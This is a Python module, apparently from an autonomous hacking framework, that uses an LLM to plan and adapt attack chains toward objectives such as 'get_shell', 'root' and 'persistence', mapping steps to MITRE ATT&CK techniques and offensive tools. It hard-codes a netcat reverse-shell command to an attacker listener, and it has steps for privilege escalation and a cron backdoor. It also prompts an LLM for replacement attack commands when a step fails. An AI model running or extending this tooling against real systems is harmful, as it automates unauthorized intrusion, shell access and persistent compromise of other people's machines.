"""
Strategic Attack Planner

Uses LLM to:
- Decompose high-level objectives into actionable steps
- Plan attack sequences based on MITRE ATT&CK
- Reason about attack graphs and dependencies
- Make strategic decisions during exploitation

This provides the "thinking" layer that transforms
"get shell on target" into executable attack steps.

Integration:
- llm_generator.py: Uses for code generation
- exploit_db.py: Maps steps to exploit templates
- autonomous_agent.py: Guides exploitation phase
"""

import json
import logging
import re
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Dict, List, Any, Optional, Tuple

logger = logging.getLogger(__name__)


class AttackObjective(Enum):
    """High-level attack objectives"""
    INITIAL_ACCESS = "initial_access"
    EXECUTION = "execution"
    PERSISTENCE = "persistence"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    DEFENSE_EVASION = "defense_evasion"
    CREDENTIAL_ACCESS = "credential_access"
    DISCOVERY = "discovery"
    LATERAL_MOVEMENT = "lateral_movement"
    COLLECTION = "collection"
    EXFILTRATION = "exfiltration"
    IMPACT = "impact"


class StepStatus(Enum):
    """Status of an attack step"""
    PENDING = "pending"
    IN_PROGRESS = "in_progress"
    SUCCESS = "success"
    FAILED = "failed"
    SKIPPED = "skipped"
    BLOCKED = "blocked"


@dataclass
class AttackStep:
    """Single step in an attack plan"""
    step_id: str
    name: str
    description: str
    objective: AttackObjective
    technique_id: str = ""  # MITRE ATT&CK ID (e.g., T1190)
    tool: str = ""
    command: str = ""
    payload: str = ""
    dependencies: List[str] = field(default_factory=list)  # step_ids this depends on
    fallback_steps: List[str] = field(default_factory=list)  # step_ids to try if this fails
    success_conditions: List[str] = field(default_factory=list)
    failure_conditions: List[str] = field(default_factory=list)
    status: StepStatus = StepStatus.PENDING
    result: Dict[str, Any] = field(default_factory=dict)
    estimated_time: int = 60  # seconds
    risk_level: str = "medium"  # low, medium, high
    
    def to_dict(self) -> Dict:
        return {
            "step_id": self.step_id,
            "name": self.name,
            "description": self.description,
            "objective": self.objective.value,
            "technique_id": self.technique_id,
            "tool": self.tool,
            "command": self.command,
            "payload": self.payload,
            "dependencies": self.dependencies,
            "fallback_steps": self.fallback_steps,
            "success_conditions": self.success_conditions,
            "failure_conditions": self.failure_conditions,
            "status": self.status.value,
            "result": self.result,
            "estimated_time": self.estimated_time,
            "risk_level": self.risk_level,
        }


@dataclass
class AttackPlan:
    """Complete attack plan with multiple steps"""
    plan_id: str
    target: str
    final_objective: str
    steps: List[AttackStep] = field(default_factory=list)
    current_step_index: int = 0
    status: str = "planning"  # planning, executing, success, failed, aborted
    created_at: str = ""
    completed_at: str = ""
    metadata: Dict[str, Any] = field(default_factory=dict)
    
    def __post_init__(self):
        if not self.created_at:
            self.created_at = datetime.now().isoformat()
    
    def get_next_step(self) -> Optional[AttackStep]:
        """Get next pending step whose dependencies are met"""
        completed_ids = {s.step_id for s in self.steps if s.status == StepStatus.SUCCESS}
        
        for step in self.steps:
            if step.status == StepStatus.PENDING:
                # Check if all dependencies are met
                if all(dep in completed_ids for dep in step.dependencies):
                    return step
        
        return None
    
    def get_fallback_for_step(self, failed_step: AttackStep) -> Optional[AttackStep]:
        """Get fallback step when a step fails"""
        for fallback_id in failed_step.fallback_steps:
            for step in self.steps:
                if step.step_id == fallback_id and step.status == StepStatus.PENDING:
                    return step
        return None
    
    def mark_step_complete(self, step_id: str, success: bool, result: Dict = None):
        """Mark a step as complete"""
        for step in self.steps:
            if step.step_id == step_id:
                step.status = StepStatus.SUCCESS if success else StepStatus.FAILED
                step.result = result or {}
                break
    
    def is_complete(self) -> bool:
        """Check if plan is complete (all required steps done)"""
        # Check if final objective was achieved
        required_completed = all(
            s.status in [StepStatus.SUCCESS, StepStatus.SKIPPED]
            for s in self.steps
            if not s.fallback_steps  # Only check non-fallback steps
        )
        return required_completed
    
    def get_progress(self) -> Dict[str, Any]:
        """Get plan execution progress"""
        total = len(self.steps)
        completed = sum(1 for s in self.steps if s.status == StepStatus.SUCCESS)
        failed = sum(1 for s in self.steps if s.status == StepStatus.FAILED)
        
        return {
            "total_steps": total,
            "completed": completed,
            "failed": failed,
            "pending": total - completed - failed,
            "progress_pct": (completed / total * 100) if total > 0 else 0,
            "current_step": self.steps[self.current_step_index].name if self.current_step_index < total else None,
        }
    
    def to_dict(self) -> Dict:
        return {
            "plan_id": self.plan_id,
            "target": self.target,
            "final_objective": self.final_objective,
            "steps": [s.to_dict() for s in self.steps],
            "current_step_index": self.current_step_index,
            "status": self.status,
            "created_at": self.created_at,
            "completed_at": self.completed_at,
            "progress": self.get_progress(),
            "metadata": self.metadata,
        }


class StrategicPlanner:
    """
    Plans attack sequences using LLM reasoning.
    
    Capabilities:
    - Decompose high-level objectives into steps
    - Map vulnerabilities to attack techniques
    - Plan optimal attack paths
    - Handle failures with fallback strategies
    
    Usage:
        planner = StrategicPlanner()
        
        # Create plan from objective
        plan = planner.create_plan(
            target="http://vulnerable.com",
            objective="get_shell",
            vulnerabilities=[...],
            context={...}
        )
        
        # Execute step by step
        while not plan.is_complete():
            step = plan.get_next_step()
            result = execute(step)
            plan.mark_step_complete(step.step_id, result.success)
    """
    
    # MITRE ATT&CK technique mappings
    TECHNIQUE_MAP = {
        "sql_injection": {"id": "T1190", "objective": AttackObjective.INITIAL_ACCESS},
        "xss": {"id": "T1189", "objective": AttackObjective.INITIAL_ACCESS},
        "command_injection": {"id": "T1059", "objective": AttackObjective.EXECUTION},
        "file_upload": {"id": "T1105", "objective": AttackObjective.INITIAL_ACCESS},
        "lfi": {"id": "T1083", "objective": AttackObjective.DISCOVERY},
        "rfi": {"id": "T1105", "objective": AttackObjective.EXECUTION},
        "ssrf": {"id": "T1090", "objective": AttackObjective.DISCOVERY},
        "auth_bypass": {"id": "T1078", "objective": AttackObjective.INITIAL_ACCESS},
        "brute_force": {"id": "T1110", "objective": AttackObjective.CREDENTIAL_ACCESS},
        "default_creds": {"id": "T1078.001", "objective": AttackObjective.INITIAL_ACCESS},
        "privesc_suid": {"id": "T1548.001", "objective": AttackObjective.PRIVILEGE_ESCALATION},
        "privesc_sudo": {"id": "T1548.003", "objective": AttackObjective.PRIVILEGE_ESCALATION},
        "reverse_shell": {"id": "T1059", "objective": AttackObjective.EXECUTION},
        "persistence_cron": {"id": "T1053.003", "objective": AttackObjective.PERSISTENCE},
        "persistence_ssh": {"id": "T1098.004", "objective": AttackObjective.PERSISTENCE},
    }
    
    # Tool mappings for each technique
    TOOL_MAP = {
        "sql_injection": ["sqlmap", "ghauri"],
        "xss": ["dalfox", "xsser"],
        "command_injection": ["commix"],
        "file_upload": ["curl", "custom"],
        "lfi": ["ffuf", "curl"],
        "ssrf": ["nuclei", "ssrfmap"],
        "auth_bypass": ["hydra", "custom"],
        "brute_force": ["hydra", "medusa"],
        "default_creds": ["hydra", "nmap"],
        "reverse_shell": ["nc", "bash", "python"],
    }
    
    def __init__(self, llm_generator=None):
        """
        Initialize strategic planner.
        
        Args:
            llm_generator: LLMExploitGenerator instance
        """
        self.llm_generator = llm_generator
        self._init_llm()
        
        # Plan history
        self.plans: Dict[str, AttackPlan] = {}
        
        logger.info("[StrategicPlanner] Initialized")
    
    def _init_llm(self):
        """Initialize LLM generator if not provided"""
        if self.llm_generator is None:
            try:
                from .llm_generator import get_llm_exploit_generator
                self.llm_generator = get_llm_exploit_generator()
            except ImportError:
                logger.warning("[StrategicPlanner] LLM generator not available")
    
    def create_plan(
        self,
        target: str,
        objective: str,
        vulnerabilities: List[Dict[str, Any]],
        context: Dict[str, Any] = None
    ) -> AttackPlan:
        """
        Create an attack plan for the given objective.
        
        Args:
            target: Target URL/IP
            objective: What to achieve (shell, data, persistence, etc.)
            vulnerabilities: Discovered vulnerabilities
            context: Additional context (technologies, credentials, etc.)
            
        Returns:
            AttackPlan with steps to execute
        """
        import uuid
        
        context = context or {}
        plan_id = str(uuid.uuid4())[:8]
        
        # Create plan structure
        plan = AttackPlan(
            plan_id=plan_id,
            target=target,
            final_objective=objective,
            metadata={
                "vulnerabilities_count": len(vulnerabilities),
                "context": context,
            }
        )
        
        # Try LLM-based planning first
        if self.llm_generator and self.llm_generator.is_available():
            llm_plan = self._create_llm_plan(target, objective, vulnerabilities, context)
            if llm_plan:
                plan.steps = llm_plan
                plan.status = "ready"
                self.plans[plan_id] = plan
                return plan
        
        # Fallback to rule-based planning
        plan.steps = self._create_rule_based_plan(target, objective, vulnerabilities, context)
        plan.status = "ready"
        self.plans[plan_id] = plan
        
        return plan
    
    def _create_llm_plan(
        self,
        target: str,
        objective: str,
        vulnerabilities: List[Dict],
        context: Dict
    ) -> Optional[List[AttackStep]]:
        """Create plan using LLM"""
        
        # Generate attack chain using LLM
        chain = self.llm_generator.generate_attack_chain(
            vulnerabilities=vulnerabilities,
            target={"url": target, **context},
            objective=objective
        )
        
        if not chain:
            return None
        
        # Parse LLM response into AttackSteps
        steps = []
        step_num = 0
        
        for step_text in chain.execution_steps:
            step_num += 1
            step = self._parse_llm_step(step_text, step_num, objective)
            if step:
                steps.append(step)
        
        return steps if steps else None
    
    def _parse_llm_step(self, step_text: str, step_num: int, objective: str) -> Optional[AttackStep]:
        """Parse LLM step text into AttackStep"""
        
        # Extract components from step text
        lines = step_text.strip().split('\n')
        name = f"Step {step_num}"
        description = ""
        tool = ""
        command = ""
        vuln_type = ""
        
        for line in lines:
            line_lower = line.lower()
            if 'step' in line_lower and ':' in line:
                name = line.split(':', 1)[-1].strip()
            elif 'vulnerability' in line_lower or 'technique' in line_lower:
                vuln_type = line.split(':')[-1].strip().lower().replace(' ', '_')
            elif 'command' in line_lower or 'payload' in line_lower:
                command = line.split(':')[-1].strip()
            elif 'tool' in line_lower:
                tool = line.split(':')[-1].strip().lower()
            else:
                description += line + " "
        
        # Map to MITRE technique
        technique_info = self.TECHNIQUE_MAP.get(vuln_type, {"id": "", "objective": AttackObjective.EXECUTION})
        
        return AttackStep(
            step_id=f"step_{step_num}",
            name=name,
            description=description.strip(),
            objective=technique_info["objective"],
            technique_id=technique_info["id"],
            tool=tool or (self.TOOL_MAP.get(vuln_type, [""])[0] if vuln_type else ""),
            command=command,
            dependencies=[f"step_{step_num-1}"] if step_num > 1 else [],
            success_conditions=["command executed", "no error"],
        )
    
    def _create_rule_based_plan(
        self,
        target: str,
        objective: str,
        vulnerabilities: List[Dict],
        context: Dict
    ) -> List[AttackStep]:
        """Create plan using rule-based logic"""
        
        steps = []
        step_num = 0
        
        # Sort vulnerabilities by severity and exploitability
        sorted_vulns = sorted(
            vulnerabilities,
            key=lambda v: (
                v.get('severity', 0) if isinstance(v.get('severity'), (int, float)) else 0,
                1 if v.get('exploitable') else 0
            ),
            reverse=True
        )
        
        # Map objective to required attack phases
        objective_phases = {
            "shell": [AttackObjective.INITIAL_ACCESS, AttackObjective.EXECUTION],
            "get_shell": [AttackObjective.INITIAL_ACCESS, AttackObjective.EXECUTION],
            "root": [AttackObjective.INITIAL_ACCESS, AttackObjective.EXECUTION, AttackObjective.PRIVILEGE_ESCALATION],
            "data": [AttackObjective.INITIAL_ACCESS, AttackObjective.CREDENTIAL_ACCESS, AttackObjective.COLLECTION],
            "persistence": [AttackObjective.INITIAL_ACCESS, AttackObjective.EXECUTION, AttackObjective.PERSISTENCE],
            "full": [AttackObjective.INITIAL_ACCESS, AttackObjective.EXECUTION, AttackObjective.PRIVILEGE_ESCALATION, AttackObjective.PERSISTENCE],
        }
        
        required_phases = objective_phases.get(objective.lower(), [AttackObjective.INITIAL_ACCESS, AttackObjective.EXECUTION])
        
        # Step 1: Initial Access via best vulnerability
        for vuln in sorted_vulns[:3]:  # Try top 3
            vuln_type = vuln.get('type', '').lower().replace(' ', '_')
            technique_info = self.TECHNIQUE_MAP.get(vuln_type, {})
            
            if technique_info.get('objective') in [AttackObjective.INITIAL_ACCESS, AttackObjective.EXECUTION]:
                step_num += 1
                tools = self.TOOL_MAP.get(vuln_type, ['manual'])
                
                steps.append(AttackStep(
                    step_id=f"step_{step_num}",
                    name=f"Exploit {vuln_type}",
                    description=f"Exploit {vuln_type} vulnerability for initial access",
                    objective=technique_info.get('objective', AttackObjective.INITIAL_ACCESS),
                    technique_id=technique_info.get('id', ''),
                    tool=tools[0] if tools else '',
                    dependencies=[],
                    fallback_steps=[f"step_{step_num + 1}"] if step_num < 3 else [],
                    success_conditions=["vulnerability confirmed", "access gained"],
                    estimated_time=120,
                ))
        
        # Step 2: Get shell if needed
        if AttackObjective.EXECUTION in required_phases:
            step_num += 1
            prev_step = f"step_{step_num - 1}" if step_num > 1 else None
            
            steps.append(AttackStep(
                step_id=f"step_{step_num}",
                name="Establish Shell",
                description="Get interactive shell access on target",
                objective=AttackObjective.EXECUTION,
                technique_id="T1059",
                tool="nc",
                command=f"nc -e /bin/sh {context.get('lhost', '10.10.14.1')} {context.get('lport', 4444)}",
                dependencies=[prev_step] if prev_step else [],
                success_conditions=["shell prompt", "uid="],
                estimated_time=60,
            ))
        
        # Step 3: Privilege Escalation if needed
        if AttackObjective.PRIVILEGE_ESCALATION in required_phases:
            step_num += 1
            
            steps.append(AttackStep(
                step_id=f"step_{step_num}",
                name="Privilege Escalation",
                description="Escalate privileges to root/admin",
                objective=AttackObjective.PRIVILEGE_ESCALATION,
                technique_id="T1548",
                tool="linpeas",
                dependencies=[f"step_{step_num - 1}"],
                success_conditions=["root", "uid=0", "Administrator"],
                estimated_time=300,
            ))
        
        # Step 4: Persistence if needed
        if AttackObjective.PERSISTENCE in required_phases:
            step_num += 1
            
            steps.append(AttackStep(
                step_id=f"step_{step_num}",
                name="Establish Persistence",
                description="Maintain access to target",
                objective=AttackObjective.PERSISTENCE,
                technique_id="T1053.003",
                tool="cron",
                dependencies=[f"step_{step_num - 1}"],
                success_conditions=["persistence established", "backdoor active"],
                estimated_time=60,
            ))
        
        return steps
    
    def get_plan(self, plan_id: str) -> Optional[AttackPlan]:
        """Get plan by ID"""
        return self.plans.get(plan_id)
    
    def suggest_next_action(
        self,
        plan: AttackPlan,
        current_state: Dict[str, Any]
    ) -> Optional[AttackStep]:
        """
        Suggest next action based on current state.
        
        Args:
            plan: Current attack plan
            current_state: Current execution state
            
        Returns:
            Recommended next step
        """
        # Get next pending step
        next_step = plan.get_next_step()
        
        if not next_step:
            # All steps complete or blocked
            return None
        
        # Check if we should skip based on current state
        if self._should_skip_step(next_step, current_state):
            next_step.status = StepStatus.SKIPPED
            return self.suggest_next_action(plan, current_state)  # Recurse
        
        return next_step
    
    def _should_skip_step(self, step: AttackStep, state: Dict) -> bool:
        """Check if step should be skipped"""
        
        # Skip privesc if already root
        if step.objective == AttackObjective.PRIVILEGE_ESCALATION:
            if state.get('is_root') or state.get('uid') == 0:
                return True
        
        # Skip persistence if objective is just shell
        if step.objective == AttackObjective.PERSISTENCE:
            if state.get('objective') == 'shell':
                return True
        
        return False
    
    def adapt_plan(
        self,
        plan: AttackPlan,
        failed_step: AttackStep,
        failure_reason: str
    ) -> AttackPlan:
        """
        Adapt plan after step failure.
        
        Args:
            plan: Current plan
            failed_step: Step that failed
            failure_reason: Why it failed
            
        Returns:
            Adapted plan
        """
        # Try fallback first
        fallback = plan.get_fallback_for_step(failed_step)
        if fallback:
            logger.info(f"[Planner] Using fallback: {fallback.name}")
            return plan
        
        # If no fallback and LLM available, generate alternative
        if self.llm_generator and self.llm_generator.is_available():
            alternative = self._generate_alternative_step(failed_step, failure_reason, plan)
            if alternative:
                # Insert alternative after failed step
                idx = plan.steps.index(failed_step) + 1
                plan.steps.insert(idx, alternative)
                logger.info(f"[Planner] Generated alternative: {alternative.name}")
        
        return plan
    
    def _generate_alternative_step(
        self,
        failed_step: AttackStep,
        failure_reason: str,
        plan: AttackPlan
    ) -> Optional[AttackStep]:
        """Generate alternative step using LLM"""
        
        # Use LLM to generate alternative approach
        prompt = f"""Previous attack step failed:
- Step: {failed_step.name}
- Objective: {failed_step.objective.value}
- Tool: {failed_step.tool}
- Reason: {failure_reason}

Suggest an alternative approach to achieve: {failed_step.objective.value}
Target: {plan.target}

Output:
ALTERNATIVE: [brief name]
TOOL: [tool to use]
COMMAND: [specific command]
REASON: [why this might work]"""

        if self.llm_generator.ollama_client:
            response = self.llm_generator.ollama_client.generate(prompt)
            if response:
                return self._parse_alternative_response(response, failed_step)
        
        return None
    
    def _parse_alternative_response(self, response: str, original: AttackStep) -> Optional[AttackStep]:
        """Parse alternative step from LLM response"""
        
        name = f"Alternative: {original.name}"
        tool = ""
        command = ""
        
        for line in response.split('\n'):
            line_lower = line.lower()
            if 'alternative:' in line_lower:
                name = line.split(':', 1)[-1].strip()
            elif 'tool:' in line_lower:
                tool = line.split(':', 1)[-1].strip()
            elif 'command:' in line_lower:
                command = line.split(':', 1)[-1].strip()
        
        if not (tool or command):
            return None
        
        return AttackStep(
            step_id=f"{original.step_id}_alt",
            name=name,
            description=f"Alternative approach for {original.objective.value}",
            objective=original.objective,
            technique_id=original.technique_id,
            tool=tool,
            command=command,
            dependencies=original.dependencies,
            success_conditions=original.success_conditions,
            estimated_time=original.estimated_time,
        )
    
    def get_stats(self) -> Dict[str, Any]:
        """Get planner statistics"""
        return {
            "total_plans": len(self.plans),
            "plans_by_status": {
                status: sum(1 for p in self.plans.values() if p.status == status)
                for status in ["planning", "ready", "executing", "success", "failed"]
            },
            "llm_available": self.llm_generator.is_available() if self.llm_generator else False,
        }


# Singleton instance
_strategic_planner: Optional[StrategicPlanner] = None


def get_strategic_planner(llm_generator=None) -> StrategicPlanner:
    """Get singleton StrategicPlanner instance"""
    global _strategic_planner
    if _strategic_planner is None:
        _strategic_planner = StrategicPlanner(llm_generator)
    return _strategic_planner
